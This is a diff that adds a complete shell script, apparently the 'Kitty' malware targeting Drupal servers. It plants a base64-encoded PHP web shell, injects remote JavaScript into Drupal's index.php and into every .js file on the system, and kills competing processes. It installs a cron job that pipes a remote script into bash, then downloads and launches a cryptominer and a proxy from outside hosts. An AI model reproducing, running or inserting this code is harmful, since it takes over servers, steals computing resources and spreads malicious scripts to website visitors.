@@ -1,0 +1,65 @@
+#!/bin/sh
+# ----====[[ Kitty v1.51 ]]====----
+echo '<?php eval(base64_decode("aWYoaXNzZXQoJF9SRVFVRVNUWydwYXNzJ10pKQogICAgeyAKICAgICAgICBlY2hvICI8cHJlPiI7IAogICAgICAgICRoYXNoID0gaGFzaCgic2hhNTEyIiwgJF9SRVFVRVNUWydwYXNzJ10pOwogICAgICAgIGlmKCRoYXNoID09ICJlN2YxYjM5ZTQ2ZWUwMDM5NzZjZWNjMTMwMzYyMDU5ZWRkMTc4NWUwZGQ4YzZiZDAyZjI5ZGY3NGNhYzNlOTM1ZDI3YTJmYTdjMzM4YTRhODIyZDdlNDkxMDA1NmQ4ZTRiNDhhYjRjNTM0MTI4YjYxZjQwN2UyZWMwMTUxZDVhNyIpCiAgICAgICAgIHsgaWYoaXNzZXQoJF9SRVFVRVNUWydjbWQnXSkpIHsgJGNtZCA9ICgkX1JFUVVFU1RbJ2NtZCddKTsgc3lzdGVtKGJhc2U2NF9kZWNvZGUoJGNtZCkpOyB9fQogICAgICAgIGVsc2UgZWNobyAiZ3RmbyI7CiAgICAgICAgZWNobyAiPC9wcmU+IjsgCiAgICAgICAgZGllOyAKICAgICB9")); ?>' >kdrupal.php
+grep gtcg0d index.php || {
+sed -i'' 's^_BOOTSTRAP_FULL);^_BOOTSTRAP_FULL);$element=array("#tag"=>"script","#attributes"=>array("src"=>"https://windworld.org/vbb/me0w.js","type"=>"text/javascript",),"#suffix"=>"'\</script\>'",);drupal_add_html_head($element,"gtcg0d");^' index.php
+}
+ps aux | grep -vw kkworker | awk '{if($3>40.0) print $2}' | while read procid
+do
+kill -9 $procid
+done
+rm -rf /dev/shm/jboss
+which curl
+if [ $? -eq 0 ]
+then
+stool="curl -s"
+otool="curl -o"
+else
+stool="wget -qO-"
+otool="wget -O"
+fi
+echo $stool
+echo $otool
+$otool timesnewroman.js https://windworld.org/vbb/me0w.js
+touch /dev/shm/1
+if [ $? -eq 0 ]
+then
+wdir="/dev/shm"
+else
+wdir="/var/tmp"
+fi
+rm -rf /dev/shm/1
+echo $wdir
+ps -fe | grep -w kkworker | grep -v grep
+if [ $? -eq 0 ]
+then
+pwd
+else
+crontab -r || true && \
+echo "* * * * * $stool http://forum.dtm.at/vbulletin/kitty 2>/dev/null | bash -s" >> /tmp/cron || true && \
+crontab /tmp/cron || true && \
+rm -rf /tmp/cron || true && \
+$otool $wdir/kkworker http://forum.dtm.at/vbulletin/kkworker 2>/dev/null
+chmod +x $wdir/kkworker
+cd $wdir
+cores=4
+proc=`grep -c ^processor /proc/cpuinfo`
+cores=$((($proc+1)/2))
+num=$(($cores*3))
+/sbin/sysctl -w vm.nr_hugepages=$num >/dev/null 2>&1
+nohup ./kkworker -o 31.220.15.54:443 --donate-level 0 -t $cores >/dev/null 2>&1 &
+fi
+$otool lightproxy http://forum.dtm.at/vbulletin/lightproxy
+chmod +x lightproxy
+nohup ./lightproxy -y3 -c route >/dev/null 2>&1 &
+cat /tmp/me0w >/dev/null 2>&1 || {
+echo 'if(!gtcg0d){function gtcg0d(){var t=document.getElementsByTagName("head")[0],e=document.createElement("script");e.type="text/javascript",e.src="https://windworld.org/vbb/me0w.js",e.async="async",t.appendChild(e)}gtcg0d()}' >/tmp/me0w
+sleep 1.337
+find / -name '*js' -type f -exec sh -c 'echo "" >> $0; cat /tmp/me0w >> $0' '{}' \; 2>/dev/null &
+}
+echo "me0w"
+echo "don't delete pls i am a harmless cute little kitty"
+echo "me0w"
+rm -rf /var/tmp/kitty
+rm -rf /dev/shm/kitty
+rm -rf /tmp/kitty
